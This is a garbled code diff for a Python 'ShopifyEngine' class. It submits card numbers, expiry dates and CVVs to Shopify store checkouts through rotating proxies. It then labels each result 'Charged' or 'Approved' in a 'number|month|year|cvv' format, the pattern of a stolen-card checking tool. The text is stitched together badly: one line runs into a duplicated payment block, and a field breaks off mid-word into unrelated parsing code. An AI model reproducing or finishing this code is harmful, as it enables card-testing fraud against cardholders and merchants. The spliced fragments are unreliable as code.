@@ -288,6 +288,54 @@ class ShopifyEngine:
                 "Charged": charged,
                 "Approved": approved,
                 "Time": f"{elapsed}s",
+                "Email": email_to_use,
+                "Store": site.store,
+                "Proxy": proxy.string,
+                "Product": product_path,
+                "Address": address.dict()
+            }
+            
+            return result, None
+            
+        except requests.exceptions.ProxyError:
+            pool_manager.mark_proxy_failed(proxy.id)
+            return None, "Proxy failed"
+            
+        except requests.exceptions.Timeout:
+            return None, "Timeout"
+            
+        except Exception as e:
+            return None, f"Error: {str(e)[:100]}"
+
+engine = ShopifyEngine()     payment_data = {
+                "authenticity_token": token,
+                "payment[gateway_token]": payment_token,
+                "payment[credit_card][number]": card.number,
+                "payment[credit_card][month]": card.month,
+                "payment[credit_card][year]": card.year,
+                "payment[credit_card][verification_value]": card.cvv,
+                "payment[credit_card][name]": f"{address.first_name} {address.last_name}"
+            }
+            
+            resp = session.post(
+                f"{site.store}/checkout/payment",
+                data=payment_data,
+                timeout=settings.TIMEOUT,
+                allow_redirects=False
+            )
+            
+            elapsed = round(time.time() - start_time, 1)
+            
+            status, charged, approved = self.analyze_response(resp, session)
+            
+            result = {
+                "Response": status,
+                "CC": f"{card.number}|{card.month}|{card.year}|{card.cvv}",
+                "Price": site.price,
+                "Gate": site.gateway,
+                "Charged": charged,
+                "Approved": approved,
+                "Time": f"{elapsed}s",
                 "Email": email_to_                return elem.get('value')
             
             elem = soup.find('meta', {'name': name})
